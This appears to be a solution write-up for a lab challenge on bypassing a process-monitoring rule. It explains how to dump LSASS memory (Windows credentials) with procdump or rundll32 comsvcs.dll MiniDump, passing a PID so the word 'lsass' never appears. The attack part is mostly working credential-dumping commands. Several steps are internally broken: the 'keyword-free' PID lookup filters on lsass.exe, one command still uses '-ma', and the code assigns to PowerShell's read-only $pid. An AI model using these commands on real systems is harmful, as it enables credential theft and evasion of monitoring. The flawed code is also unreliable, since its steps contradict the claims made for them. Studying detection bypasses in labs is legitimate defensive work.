---
title: "Solution 13: LSASS Without Keywords"
difficulty: medium
category: "Process Monitoring Bypass"
---

[Back to Challenge]({{ '/challenges/13-lsass-without-keywords/' | relative_url }})

## Overview

Rule 4 requires both a tool name match AND the keyword "lsass" or "-ma" in the command line. Omitting the keyword breaks the dual condition.

## Solution

```powershell
# Step 1: Find the LSASS PID without using the word "lsass"
$pid = (Get-Process -Id 4 | ForEach-Object { Get-Process -Id $_.Id }).Id
# Or use tasklist and parse the output
tasklist /fi "imagename eq lsass.exe" | Select-String "\d+" | ForEach-Object { $_.Matches.Value }

# Step 2: Use the PID instead of the name
procdump.exe -ma 672        # PID instead of "lsass"
procdump.exe -accepteula 672  # No "lsass" or "-ma" keyword

# Step 3: Use comsvcs.dll with PID
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Temp\out.dmp full
# Wait - "comsvcs" IS in the indicator list...
# But the rule checks: tool_name AND ("lsass" in cmd OR "-ma" in cmd)
# "672" is not "lsass", so the second condition fails!
```

## Why It Works

Rule 4's logic requires BOTH conditions:

```nim
if tool in nameLower or tool in cmdLower:
  if "lsass" in cmdLower or "-ma" in cmdLower:  # This fails when using PID
```

Using a PID instead of the process name means "lsass" never appears in the command line, so the second condition is never met.
